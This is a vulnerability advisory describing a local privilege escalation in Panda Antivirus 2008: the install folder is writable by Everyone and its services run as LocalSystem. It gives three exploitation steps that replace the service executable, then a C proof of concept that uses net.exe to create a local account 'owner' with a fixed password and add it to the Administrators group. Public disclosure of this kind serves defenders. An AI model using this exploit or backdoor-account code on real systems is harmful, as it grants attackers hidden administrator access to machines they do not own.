Severity: Medium
Title: Panda Antivirus 2008 Local Privileg Escalation
Date: 02.08.07
Author: tarkus (tarkus (at) tiifp (dot) org)
URL: https://tiifp.org/tarkus
Vendor: Panda (http://www.pandasoftware.com/)
Affected Products: Panda Antivirus 2008
Not Affected Products: - Panda Internetsecurity 2008

Description:
- ------------

1. During installation of Panda Antivirus 2008 the permissions for
installation folder %ProgramFiles%\Panda Security\Panda Antivirus
2008by default are set to Everyone:Full Control. Few services
(e.g. PAVSRV51.EXE) are started from this folder. Services are
started
under LocalSystem account. There is no protection of service files.
It's
possible for unprivileged user to replace service executable with the
file of his choice to get full access with LocalSystem privileges. Or
to
get privileges or any user (including system administrator) who
logons
to vulnerable host. This can be exploited by:

a. Rename PAVSRV51.exe to PAVSRV51.old in Panda folder
b. Copy any application to PAVSRV51.exe
c. Reboot

Upon reboot trojaned application will be executed with LocalSystem
account.

BTW: Check this from last year
(http://www.securityfocus.com/bid/19891)

POC:
- ----

#include <windows.h>
#include <stdio.h>

INT main( VOID )
{
CHAR szWinDir[ _MAX_PATH ];
CHAR szCmdLine[ _MAX_PATH ];

GetEnvironmentVariable( "WINDIR", szWinDir, _MAX_PATH );

printf( "Creating user \"owner\" with password
\"PandaOWner123\"...\n" );

wsprintf( szCmdLine, "%s\\system32\\net.exe user owner PandaOWner123
/add", szWinDir );

system( szCmdLine );

printf( "Adding user \"owner\" to the local Administrators
group...\n" );

wsprintf( szCmdLine, "%s\\system32\\net.exe localgroup Administrators
owner /add", szWinDir );

system( szCmdLine );

return 0;
}
